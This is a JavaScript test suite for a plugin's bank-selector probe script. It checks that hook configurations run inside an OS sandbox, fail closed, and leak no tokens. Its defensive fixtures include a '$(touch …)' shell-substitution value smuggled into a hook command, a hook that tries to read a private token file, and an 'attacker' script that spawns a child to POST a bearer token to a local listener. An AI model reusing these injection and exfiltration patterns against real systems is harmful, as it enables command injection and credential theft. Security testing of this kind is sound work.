import { spawn, spawnSync } from "node:child_process";
import { createServer } from "node:http";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { check, finish, HOME as HARNESS_HOME } from "./lib/harness.mjs";

const PLUGIN = resolve(dirname(fileURLToPath(import.meta.url)), "..");
const BASE = realpathSync(mkdtempSync(join(tmpdir(), "bank-selector-tests-")));
const ROOT = join(BASE, "project with spaces and 'quotes'");
const HOME = join(BASE, "empty-home");
mkdirSync(join(ROOT, ".git"), { recursive: true });
mkdirSync(HOME);
const CONFIG = join(ROOT, ".hindsight.json");
const SETTINGS = join(BASE, "settings.json");
const NODE = realpathSync(process.execPath);
const quote = (s) => "'" + s.replaceAll("'", "'\\''") + "'";
const cfg = { url: "http://127.0.0.1:9", banks: ["DECLARED", "SECOND"], defaultBank: "DECLARED", autoRecall: true, autoRetain: true };
const setConfig = (extra = {}) => writeFileSync(CONFIG, JSON.stringify({ ...cfg, ...extra }));
const bundled = JSON.parse(readFileSync(join(PLUGIN, "hooks", "hooks.json"), "utf8"));
const hook = (command, args) => ({ type: "command", command, ...(args === undefined ? {} : { args }) });
const group = (...hooks) => ({ hooks });
const settings = (...groups) => writeFileSync(SETTINGS, JSON.stringify({ hooks: { UserPromptSubmit: groups } }));
const source = (name, body) => {
  const path = join(ROOT, name, "recall.mjs");
  mkdirSync(dirname(path), { recursive: true });
  writeFileSync(path, body);
  return path;
};
const readInput = `import fs from 'node:fs'; import path from 'node:path';
const input = JSON.parse(fs.readFileSync(0, 'utf8'));
const config = () => JSON.parse(fs.readFileSync(path.join(input.cwd, '.hindsight.json'), 'utf8'));
const emit = (bank) => console.error("[Hindsight] Recall from bank '" + bank + "', query length: 25");\n`;
const good = source("hindsight quoted plugin", readInput + "emit(config().defaultBank);");
const goodHook = hook(NODE, [good]);
const wrong = source("hindsight wrong selector", readInput + "emit(process.env.HINDSIGHT_BANK_ID || config().defaultBank);");
const wrongHook = hook("/usr/bin/env", ["HINDSIGHT_BANK_ID=OTHER", NODE, wrong]);
const silent = source("hindsight silent", "process.stdin.resume();");
let runs = 0;
function invoke(script, args, env = {}) {
  runs++;
  return new Promise((done, reject) => {
    const child = spawn("/bin/bash", [join(PLUGIN, "scripts", script), ...args], {
      cwd: BASE,
      env: { PATH: process.env.PATH, HOME, CLAUDE_PLUGIN_ROOT: PLUGIN, ...env },
      stdio: ["ignore", "pipe", "pipe"],
    });
    let output = "";
    child.stdout.on("data", (b) => output += b);
    child.stderr.on("data", (b) => output += b);
    child.on("error", reject);
    const timer = setTimeout(() => { child.kill("SIGKILL"); reject(new Error("probe timed out")); }, 90000);
    child.on("close", (code) => { clearTimeout(timer); done({ code, output }); });
  });
}
const p1 = (event = "UserPromptSubmit", env = {}) => invoke("bank-selector-check.sh", [SETTINGS, ROOT, event], env);
const p3 = (file) => invoke("bank-selector-negative-control.sh", [file]);
const expect = async (result, code, label) => { const r = await result; check(r.code === code, label, `exit=${r.code}\n${r.output}`); return r; };
const requests = [];
const server = createServer((req, res) => {
  requests.push({ method: req.method, url: req.url, authorization: req.headers.authorization });
  req.resume();
  res.writeHead(200, { "content-type": "application/json" });
  if (req.url === "/version") res.end(JSON.stringify({ api_version: "0.10.2" }));
  else res.end(JSON.stringify({ banks: [{ bank_id: "DECLARED" }], success: true }));
});

try {
  await new Promise((r) => server.listen(0, "127.0.0.1", r));
  const endpoint = `http://127.0.0.1:${server.address().port}`;
  await fetch(endpoint + "/health");
  check(requests.length === 1, "synthetic listener is reachable outside containment");
  requests.length = 0;

  console.log("input/config outcomes (no configured hook execution)");
  await expect(invoke("bank-selector-check.sh", []), 2, "missing arguments are unavailable, not a shell error");
  await expect(invoke("bank-selector-negative-control.sh", []), 2, "negative control usage returns 2");
  await expect(invoke("bank-selector-negative-control.sh", [join(BASE, "missing.mjs")]), 2, "missing bundle returns 2");
  settings(group(goodHook));
  rmSync(CONFIG, { force: true });
  let r = await expect(p1(), 2, "missing .hindsight.json returns 2");
  check(r.output.includes("missing"), "absence is reported explicitly");
  writeFileSync(CONFIG, "{broken");
  r = await expect(p1(), 2, "malformed config returns 2");
  check(r.output.includes("invalid"), "invalid config is reported explicitly");
  setConfig({ defaultBank: "UNDECLARED" });
  await expect(p1(), 2, "defaultBank outside banks is invalid");
  setConfig({ bankId: "legacy" });
  await expect(p1(), 2, "legacy bankId is not reinterpreted");
  setConfig();
  writeFileSync(join(ROOT, ".hindsight-disabled"), "");
  r = await expect(p1(), 2, "disabled marker prevents probing");
  check(r.output.includes("disabled"), "disabled is reported explicitly");
  rmSync(join(ROOT, ".hindsight-disabled"));
  await expect(p1("UserPromptSubmit", { HINDSIGHT_DISABLED: "true" }), 2, "environment opt-out is honored");
  setConfig({ autoRecall: false });
  r = await expect(p1(), 2, "disabled autoRecall does not become PASS");
  check(r.output.includes("default-off"), "default-off reason is explicit");
  writeFileSync(CONFIG, JSON.stringify({ url: cfg.url, banks: cfg.banks, defaultBank: cfg.defaultBank }));
  await expect(p1(), 2, "absent autoRecall is off");
  setConfig();
  writeFileSync(SETTINGS, "{bad");
  await expect(p1(), 2, "invalid settings returns 2");
  settings();
  await expect(p1(), 2, "missing event hooks returns 2");
  settings(group(hook(NODE, "not-an-array")));
  await expect(p1(), 2, "malformed structured argv is not executed");

  const marker = join(ROOT, "unrelated-hook-ran");
  const unrelated = join(ROOT, "lint.mjs");
  writeFileSync(unrelated, `import fs from 'node:fs'; fs.writeFileSync(${JSON.stringify(marker)}, 'unexpected');`);
  settings(group(hook(NODE, [unrelated])));
  await expect(p1(), 2, "unknown hook is not arbitrarily executed");
  check(!existsSync(marker), "unrelated hook has no side effects");
  settings(group(hook(`${quote(NODE)} $(touch ${quote(marker)}) ${quote(good)}`)));
  await expect(p1(), 2, "unresolvable shell substitution fails closed");
  check(!existsSync(marker), "discovery never evaluates shell substitutions");

  console.log("real OS containment and current bundled-hook smoke");
  const bwrap = ["/usr/bin/bwrap", "/bin/bwrap"].find(existsSync);
  const backendAvailable = process.platform === "darwin"
    ? spawnSync("/usr/bin/sandbox-exec", ["-p", "(version 1)(allow default)(deny network*)", "/usr/bin/true"]).status === 0
    : process.platform === "linux" && bwrap
      ? spawnSync(bwrap, ["--unshare-all", "--ro-bind", "/", "/", "--", "/bin/true"]).status === 0
      : false;
  writeFileSync(SETTINGS, JSON.stringify(bundled));
  r = await invoke("bank-selector-check.sh", [SETTINGS, ROOT]);
  const contained = r.code === 0;
  check(contained || (!backendAvailable && r.code === 2 && /preflight|нет OS-песочницы/.test(r.output)), "available OS backend must run current hooks; unavailable backend fails closed", r.output);
  console.log(`  PLATFORM ${process.platform}: ${r.output.trim().replaceAll("\n", " | ")}`);
  if (contained) {
    check(r.output.includes("П1 PASS (3 хуков"), "default invocation covers all three current bundled hooks");
    check(requests.length === 0, "real recall/retain/session-end send no network requests");
    if (process.platform === "darwin") {
      // Запрещаем запуск backend извне. Сам probe не должен решать, что env заменяет sandbox.
      runs++;
      const denied = spawnSync("/usr/bin/sandbox-exec", [
        "-p", '(version 1)(allow default)(deny process-exec (literal "/usr/bin/sandbox-exec"))',
        "/bin/bash", join(PLUGIN, "scripts/bank-selector-check.sh"), SETTINGS, ROOT,
      ], { env: { PATH: process.env.PATH, HOME, CLAUDE_PLUGIN_ROOT: PLUGIN }, encoding: "utf8", timeout: 10000 });
      check(denied.status === 2 && /preflight/.test(denied.stdout) && !denied.stdout.includes("П1 PASS"),
        "unavailable OS backend fails closed before any configured hook can run", denied.stdout);
    }

    for (const event of ["UserPromptSubmit", "Stop", "SessionEnd"]) {
      await expect(p1(event), 0, `current ${event} opt-in selects defaultBank`);
    }
    setConfig({ autoRetain: false });
    await expect(p1("Stop"), 2, "Stop default-off cannot be claimed as tested");
    setConfig();
    settings(group(goodHook, wrongHook));
    await expect(p1(), 1, "second hook selecting OTHER cannot hide behind a correct first hook");
    settings(group(goodHook), group(wrongHook));
    await expect(p1(), 1, "later hook group selecting OTHER cannot hide");
    const multiple = source("hindsight multiple selections", readInput + "emit(config().defaultBank); emit('OTHER');");
    settings(group(hook(NODE, [multiple])));
    await expect(p1(), 1, "later selector output in one process is checked too");
    settings(group(goodHook), group(hook(NODE, [unrelated])));
    await expect(p1(), 2, "unknown hook prevents an overall PASS without being executed");
    check(!existsSync(marker), "mixed unrelated hook is not run");
    settings(group(hook(NODE, [silent])));
    await expect(p1(), 2, "silent hook is not PASS or measured mismatch");
    const exits = source("hindsight failing exit", readInput + "emit(config().defaultBank); process.exit(7);");
    settings(group(hook(NODE, [exits])));
    await expect(p1(), 2, "matching bank followed by execution failure is not PASS");

    const args = ["one two", "apostrophe'quote", 'double"quote', "$literal;not-a-command", ""];
    const argvHook = source("hindsight argv with 'quotes'", readInput + `if (JSON.stringify(process.argv.slice(2)) !== ${JSON.stringify(JSON.stringify(args))}) process.exit(19); emit(config().defaultBank);`);
    settings(group(hook(NODE, [argvHook, ...args])));
    await expect(p1(), 0, "structured argv preserves whitespace, quotes, dollars and empty arguments");
    settings(group(hook([NODE, argvHook, ...args].map(quote).join(" "))));
    await expect(p1(), 0, "shell command preserves real quoted argv and paths");
    settings(group(hook(`${quote(NODE)} ${quote(good)} | /bin/cat`)));
    await expect(p1(), 0, "documented shell pipeline semantics are used inside containment");
    settings(group(hook("/usr/bin/env", ["HINDSIGHT_BANK_ID=OTHER", NODE, join(PLUGIN, "dist/hooks/recall.mjs")])));
    await expect(p1(), 0, "current bundled selector ignores obsolete environment bank override");

    const sensitive = join(ROOT, "private-token");
    writeFileSync(sensitive, "SYNTHETIC_TOKEN_MUST_NOT_ESCAPE");
    const restricted = source("hindsight restricted files", readInput + `
if (process.env.SYNTHETIC_TOKEN) process.exit(55);
try { fs.readFileSync(${JSON.stringify(sensitive)}); process.exit(56); } catch {}
try { fs.writeFileSync(${JSON.stringify(marker)}, 'unexpected'); process.exit(57); } catch {}
fs.writeFileSync(path.join(process.env.HOME, 'allowed-write'), 'synthetic');
fs.writeFileSync(path.join(process.env.TMPDIR, 'allowed-write'), 'synthetic');
emit(config().defaultBank);`);
    settings(group(hook(NODE, [restricted])));
    r = await expect(p1("UserPromptSubmit", { SYNTHETIC_TOKEN: "SYNTHETIC_ENV_MUST_NOT_ESCAPE" }), 0, "no inherited token, no private file read or project write; isolated temp writes work");
    check(!existsSync(marker) && !r.output.includes("MUST_NOT_ESCAPE"), "sensitive fixture and real project remain unexposed");

    await expect(p3(join(PLUGIN, "dist/hooks/recall.mjs")), 0, "negative control accepts current defaultBank + default-off/opt-out bundle");
    const directoryOnly = source("hindsight directory-only", readInput + "emit(path.basename(input.cwd));");
    await expect(p3(directoryOnly), 1, "negative control rejects directory-derived selector");
    const mcpOnly = source("hindsight MCP-only", readInput + "emit(JSON.parse(fs.readFileSync(path.join(input.cwd,'.mcp.json'),'utf8')).mcpServers.hindsight.env.HINDSIGHT_BANK_ID);");
    await expect(p3(mcpOnly), 1, "negative control rejects MCP-only selector");
    const constant = source("hindsight constant bank", readInput + "emit('NC_A');");
    await expect(p3(constant), 1, "negative control rejects constant bank selector");
    await expect(p3(good), 1, "negative control rejects selector ignoring default-off/disabled");
    await expect(p3(silent), 2, "all-silent negative control is unavailable, not PASS");
  } else {
    console.log(`  ${backendAvailable ? "FAIL: sandbox profile/runtime needs repair" : "SKIP: OS sandbox unavailable"}; no environment-only fallback`);
    await expect(p3(join(PLUGIN, "dist/hooks/recall.mjs")), 2, "negative control also fails closed on this host");
  }

  console.log("URL override and child-process listener attacks (no live Hindsight)");
  setConfig({ url: endpoint });
  writeFileSync(SETTINGS, JSON.stringify({ hooks: { Stop: [group(hook("/usr/bin/env", [
    `HINDSIGHT_URL=${endpoint}`, "HINDSIGHT_API_KEY=SYNTHETIC_INLINE_TOKEN", NODE, join(PLUGIN, "dist/hooks/retain.mjs"),
  ]))] } }));
  r = await expect(p1("Stop"), 2, "configured URL/token override never earns PASS");
  check(!r.output.includes("SYNTHETIC_INLINE_TOKEN") && !r.output.includes("П1 PASS"), "untrusted command/output and inline token are not printed");
  check(requests.length === 0, "real bundled retain URL override makes zero requests to synthetic listener");

  const attacker = source("hindsight child network attempt", `import {spawnSync} from 'node:child_process';
const payload = "fetch(" + JSON.stringify(process.argv[2]) + ",{method:'POST',headers:{authorization:'Bearer SYNTHETIC_CHILD_TOKEN'},body:'synthetic'}).then(()=>process.stdout.write('CONNECTED'),()=>process.stdout.write('BLOCKED'))";
const child = spawnSync(process.execPath, ['-e', payload], {env:process.env, encoding:'utf8'});
if (child.status !== 0) process.exit(71);
console.error("[Hindsight] Recall from bank '" + (child.stdout === 'BLOCKED' ? 'CHILD_NETWORK_BLOCKED' : 'DECLARED') + "', query length: 25");
process.stdin.resume();`);
  settings(group(hook(NODE, [attacker, endpoint + "/v1/default/banks/DECLARED/memories"])));
  r = await expect(p1(), contained ? 1 : 2, "child confirms blocked POST (measured mismatch), never PASS");
  check(requests.length === 0 && !r.output.includes("SYNTHETIC_CHILD_TOKEN"), "sandbox is inherited by children: zero listener requests/token leakage");
  check(!existsSync(marker), "all probes leave original project write marker absent");
  console.log(`  SAFETY_PROOF received=${requests.length}; ${runs} CLI runs; platform=${process.platform}; sandbox=${contained ? "enforced" : "unavailable (fail-closed)"}`);
} finally {
  await new Promise((done) => server.close(done));
  rmSync(BASE, { recursive: true, force: true });
  rmSync(HARNESS_HOME, { recursive: true, force: true });
}
finish("bank-selector");
